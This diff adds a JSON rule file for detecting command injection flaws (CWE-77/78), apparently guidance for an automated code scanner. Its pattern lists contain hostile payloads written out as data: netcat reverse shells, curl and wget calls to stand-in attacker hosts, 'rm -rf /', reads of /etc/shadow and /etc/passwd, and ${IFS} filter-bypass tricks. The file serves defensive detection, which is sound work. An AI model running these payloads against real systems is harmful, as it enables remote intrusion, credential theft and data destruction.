@@ -1,0 +1,44 @@
+{
+  "title": "Command Injection Detection (CWE-77/78)",
+  "objective": "Identify exploitable command injection vulnerabilities by analyzing system command execution that incorporates unsanitized user input, allowing attackers to execute arbitrary commands on the host system. Report only confirmed paths where shell metacharacters or command separators can break out of intended command context with high confidence in remote code execution.",
+  "method": {
+    "sources": ["URL parameters", "POST body data", "HTTP headers", "File uploads", "Cookie values", "JSON/XML payloads", "WebSocket messages", "Database content", "Environment variables"],
+    "flow": "Trace user-controlled input concatenated or interpolated into system commands without proper sanitization or escaping",
+    "sinks": ["system() calls", "exec() functions", "shell_exec()", "popen()", "subprocess calls", "Runtime.exec()", "Process.start()", "eval() with shell commands", "Template command execution"],
+    "validation": "Exclude if using parameterized commands, whitelist validation, proper escaping, or subprocess with shell=False"
+  },
+  "patterns": {
+    "shell_metacharacters": ["; cat /etc/passwd", "| nc attacker.com 4444", "& whoami", "|| curl evil.com", "`id`", "$(uname -a)"],
+    "command_chaining": ["file.txt; rm -rf /", "input && wget malware.sh", "param || /bin/bash"],
+    "redirection": ["> /tmp/backdoor", "< /etc/shadow", ">> /var/log/attack.log", "2>&1"],
+    "background_execution": ["& python reverse_shell.py", "nohup nc -e /bin/sh &"],
+    "string_interpolation": ["system(f'ping {user_host}')", "`ping ${user_input}`", "exec(`command ${param}`)"],
+    "injection_contexts": ["ping -c 1 {host}", "find /path -name '{filename}'", "grep '{pattern}' file.txt"],
+    "encoded_payloads": ["%3B%20cat%20%2Fetc%2Fpasswd", "\\x3b\\x20id", "unicode escape sequences"],
+    "advanced_bypass": ["${IFS}cat${IFS}/etc/passwd", "$'\\x2f'bin$'\\x2f'sh", "co''mm''and injection"]
+  },
+  "report_format": {
+    "file": "path:line",
+    "type": "Shell_Metachar|Command_Chain|String_Interpolation|Context_Escape|Background_Exec",
+    "source": "url_param|post_data|header|file_upload|json_field",
+    "sink": "system_call|exec_function|subprocess|shell_exec|runtime_exec",
+    "flow": "user_input→string_concat→command_execution",
+    "code": "os.system(f'ping -c 1 {user_host}')",
+    "payload": "google.com; cat /etc/passwd",
+    "fix": "Use subprocess.run(['ping', '-c', '1', user_host], shell=False) with argument array"
+  },
+  "rules": [
+    "Trace user input to command execution with exact line numbers and command construction",
+    "Provide specific injection payload that exploits the command context",
+    "Suggest secure alternatives (subprocess with shell=False, parameterized commands, whitelisting)",
+    "Verify command execution context determines impact (web server vs root vs container)",
+    "Apply high confidence threshold; ignore if proper input validation or safe execution methods detected",
+    "Consider both direct command injection and indirect injection through files or databases",
+    "Flag system administration and file operation commands as high-risk injection points",
+    "Analyze template engines and configuration files that execute system commands",
+    "Check for both obvious shell metacharacters and advanced bypass techniques",
+    "Identify cases where command injection could lead to privilege escalation or lateral movement",
+    "Consider different shell environments (bash, sh, cmd.exe, PowerShell) and their metacharacters",
+    "Focus on functions that invoke system shell vs direct process execution"
+  ]
+}
